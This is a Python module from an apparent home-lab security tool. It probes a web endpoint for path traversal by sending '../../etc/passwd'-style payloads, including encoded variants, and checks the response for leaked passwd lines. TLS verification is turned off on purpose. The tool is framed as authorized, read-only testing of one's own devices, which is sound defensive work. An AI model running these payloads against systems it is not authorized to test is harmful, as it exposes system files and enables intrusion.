"""Path-traversal input-boundary probe.

Checks whether a file-serving endpoint properly confines its path input, or
lets `../` sequences climb out of the intended directory and read arbitrary
files. Detection keys on a leaked /etc/passwd signature in the response.

SCOPE / SAFETY:
    * Authorized use only — run this against your OWN home-lab devices.
    * READ-ONLY: we only request a few classic traversal paths and inspect the
      response. Nothing is written or changed on the device. The only file we
      look for is /etc/passwd, purely as a boundary-check signal.
    * This confirms whether the boundary holds; it does not harvest files.

Like the other stages, a run produces a TraversalResult dataclass and is saved
as JSON under ../artifacts/ via report.save().
"""
from __future__ import annotations

import re
import ssl
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

from . import report

# Classic traversal test inputs (plain, URL-encoded, and doubled variants).
PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
]

# /etc/passwd line signature, e.g. "root:x:0:0:root:/root:/bin/sh".
PASSWD_RE = re.compile(r"^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:[^:]*:[^:]*:", re.I | re.M)
ROOT_RE = re.compile(r"root:[^:]*:0:0:", re.I)

_MAXREAD = 1 << 16  # cap response read at 64 KiB


@dataclass
class TraversalResult:
    host: str
    endpoint: str
    parameter: str
    vulnerable: bool = False
    payload_that_worked: str | None = None
    evidence: str | None = None
    tested_payloads: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


def _insecure_ctx() -> ssl.SSLContext:
    """CPE mgmt pages use self-signed certs — don't fail on them."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, method: str, param: str, value: str,
          timeout: float = 8.0) -> tuple[str | None, str | None]:
    """Send one request with {param: value}. Return (body, error).

    `value` may already contain percent-encoding (e.g. ..%2f); we pass it in
    the query with safe='%/' so those sequences are preserved verbatim.
    """
    ctx = _insecure_ctx() if url.lower().startswith("https") else None
    headers = {"User-Agent": "weaknd/0.1"}
    qs = urllib.parse.urlencode({param: value}, safe="%/.")
    if method.upper() == "GET":
        sep = "&" if "?" in url else "?"
        req = urllib.request.Request(url + sep + qs, headers=headers)
    else:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=qs.encode(), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read(_MAXREAD).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as e:
        try:
            return e.read(_MAXREAD).decode("utf-8", "replace"), None
        except Exception:
            return "", f"HTTPError {e.code} (no body)"
    except (urllib.error.URLError, OSError, ValueError) as e:
        return None, f"{type(e).__name__}: {e}"


def _passwd_line(body: str) -> str | None:
    """Return the first /etc/passwd-looking line, if any."""
    m = ROOT_RE.search(body)
    if m:
        for line in body.splitlines():
            if m.group(0) in line:
                return line.strip()[:200]
        return m.group(0)
    m = PASSWD_RE.search(body)
    return m.group(0).strip()[:200] if m else None


def probe_traversal(base_url: str, endpoint_path: str, param_name: str,
                    http_method: str = "GET") -> TraversalResult:
    """Test whether a path parameter can climb out to read /etc/passwd.

    For each traversal payload, look for a passwd-format signature in the
    response. First match → vulnerable, with the leaked line as evidence.
    """
    host = urllib.parse.urlparse(base_url).hostname or base_url
    url = base_url.rstrip("/") + "/" + endpoint_path.lstrip("/")
    res = TraversalResult(host=host, endpoint=endpoint_path, parameter=param_name,
                          tested_payloads=list(PAYLOADS))

    for payload in PAYLOADS:
        body, err = _send(url, http_method, param_name, payload)
        if err:
            res.notes.append(f"{payload!r}: {err}")
            continue
        line = _passwd_line(body)
        if line:
            res.vulnerable = True
            res.payload_that_worked = payload
            res.evidence = line
            res.notes.append(f"{payload!r} leaked a passwd-format file — path boundary not enforced")
            return res
        res.notes.append(f"{payload!r}: no file leak signature")

    res.notes.append("no traversal leak seen — path input appears confined (good)")
    return res


def run(base_url: str, endpoint_path: str, param_name: str,
        http_method: str = "GET", save: bool = True) -> TraversalResult:
    """Probe + persist, mirroring the other stages' report.save() behavior."""
    res = probe_traversal(base_url, endpoint_path, param_name, http_method)
    if save:
        report.save("traversal", res.host, res)
    return res


if __name__ == "__main__":
    # Standalone runner (run from the tool/ dir so package imports resolve):
    #   python -m weaknd.traversal_probe 192.168.1.1 --endpoint /download --param file
    import argparse

    ap = argparse.ArgumentParser(description="Path-traversal input-boundary probe "
                                             "(own-device test, read-only).")
    ap.add_argument("host", help="device host/IP (own lab device)")
    ap.add_argument("--endpoint", required=True, help="file-serving endpoint path, e.g. /download")
    ap.add_argument("--param", required=True, help="parameter name carrying the path")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    a = ap.parse_args()

    base = f"{a.scheme}://{a.host}"
    r = run(base, a.endpoint, a.param, a.method)
    print(f"\n=== traversal-probe ===")
    print(f"  host:       {r.host}")
    print(f"  endpoint:   {r.endpoint}  (param={r.parameter}, {a.method})")
    print(f"  vulnerable: {'YES' if r.vulnerable else 'no'}")
    if r.vulnerable:
        print(f"  payload:    {r.payload_that_worked}")
        print(f"  evidence:   {r.evidence}")
    for n in r.notes:
        print(f"   - {n}")
